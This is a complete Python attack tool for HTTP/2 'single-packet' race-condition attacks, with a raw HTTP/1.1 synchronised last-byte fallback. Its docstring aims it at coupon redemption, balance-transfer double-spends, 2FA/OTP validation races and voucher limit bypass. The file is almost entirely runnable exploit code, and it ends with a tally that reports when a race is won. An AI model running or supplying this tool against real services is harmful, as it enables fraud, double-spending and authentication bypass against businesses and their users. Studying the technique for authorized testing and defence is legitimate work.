#!/usr/bin/env python3
"""
race_single_packet.py - HTTP/2 single-packet race-condition attack (2024-2026).

Implements James Kettle's "single-packet attack": send N requests so the last
byte of each is withheld, then release all last bytes at once so the requests
arrive within ~1ms, neutralising network jitter. Uses HTTP/2 multiplexing when
available (httpx[http2]) and falls back to a synchronised HTTP/1.1 last-byte
release over many sockets.

Targets: coupon redemption, balance transfers (double-spend), 2FA/OTP
validation races, voucher/limit bypass, "check then act" TOCTOU.

Dependency:
  pip install "httpx[http2]"   (preferred, true single-packet via HTTP/2)
  stdlib socket fallback always available.

Usage:
  # HTTP/2 single packet (preferred)
  python3 race_single_packet.py https://t/redeem -X POST \
      -H "Cookie: session=..." -H "Content-Type: application/x-www-form-urlencoded" \
      -d "code=DISCOUNT50" -n 30

  # Force the raw HTTP/1.1 last-byte-sync fallback
  python3 race_single_packet.py https://t/redeem -d "code=X" -n 30 --raw

LEGAL: authorized testing only. Races can mutate real state (money/inventory).
"""
import argparse
import socket
import ssl
import sys
import threading
import time
from urllib.parse import urlparse


def http2_attack(url, method, headers, body, n, insecure):
    try:
        import httpx
    except ImportError:
        print("[!] httpx not installed; falling back to --raw")
        return None
    limits = httpx.Limits(max_connections=1, max_keepalive_connections=1)
    client = httpx.Client(http2=True, verify=not insecure, limits=limits, timeout=30)
    results = [None] * n
    barrier = threading.Barrier(n)

    def fire(i):
        barrier.wait()  # all threads release together -> concurrent stream frames
        try:
            r = client.request(method, url, headers=headers, content=body)
            results[i] = (r.status_code, len(r.content))
        except Exception as e:
            results[i] = ("ERR", str(e)[:40])

    threads = [threading.Thread(target=fire, args=(i,)) for i in range(n)]
    t0 = time.time()
    for t in threads: t.start()
    for t in threads: t.join()
    client.close()
    print(f"[*] HTTP/2 single-packet: {n} reqs in {time.time()-t0:.3f}s")
    return results


def raw_attack(url, method, headers, body, n, insecure):
    u = urlparse(url)
    use_tls = u.scheme == "https"
    host = u.hostname
    port = u.port or (443 if use_tls else 80)
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    hdr_lines = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
    head = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\n{hdr_lines}"
            f"Content-Length: {len(body)}\r\nConnection: keep-alive\r\n\r\n").encode()
    if body:
        head += body.encode()[:-1]  # everything except the last byte
        last_byte = body.encode()[-1:]
    else:
        # for bodyless requests withhold the final CRLF byte
        head, last_byte = head[:-1], head[-1:]

    socks = []
    for _ in range(n):
        raw = socket.create_connection((host, port), timeout=15)
        if use_tls:
            ctx = ssl.create_default_context()
            if insecure:
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["http/1.1"])
            raw = ctx.wrap_socket(raw, server_hostname=host)
        raw.sendall(head)  # send all but the final byte, leave socket primed
        socks.append(raw)

    time.sleep(0.15)  # let all primed requests reach the server's buffer
    barrier = threading.Barrier(n)
    results = [None] * n

    def release(i, s):
        barrier.wait()
        try:
            s.sendall(last_byte)  # synchronised final-byte release
            s.settimeout(15)
            resp = s.recv(4096)
            line = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
            results[i] = line
        except Exception as e:
            results[i] = f"ERR {e}"
        finally:
            s.close()

    threads = [threading.Thread(target=release, args=(i, s)) for i, s in enumerate(socks)]
    t0 = time.time()
    for t in threads: t.start()
    for t in threads: t.join()
    print(f"[*] raw last-byte-sync: {n} reqs released in {time.time()-t0:.3f}s")
    return results


def main():
    ap = argparse.ArgumentParser(description="HTTP/2 single-packet race attack (2024-2026)")
    ap.add_argument("url")
    ap.add_argument("-X", "--method", default="POST")
    ap.add_argument("-H", "--header", action="append", default=[], help="Header: value")
    ap.add_argument("-d", "--data", default="", help="request body")
    ap.add_argument("-n", "--count", type=int, default=30)
    ap.add_argument("--raw", action="store_true", help="force HTTP/1.1 last-byte-sync fallback")
    ap.add_argument("--insecure", action="store_true")
    args = ap.parse_args()

    headers = {}
    for h in args.header:
        k, v = h.split(":", 1); headers[k.strip()] = v.strip()

    results = None
    if not args.raw:
        results = http2_attack(args.url, args.method, headers, args.data, args.count, args.insecure)
    if results is None:
        results = raw_attack(args.url, args.method, headers, args.data, args.count, args.insecure)

    from collections import Counter
    summary = Counter(str(r) for r in results)
    print("[*] response distribution:")
    for k, v in summary.items():
        print(f"    {v:4}x  {k}")
    print("[i] multiple distinct successes for a 'single-use' action == race won.")


if __name__ == "__main__":
    main()
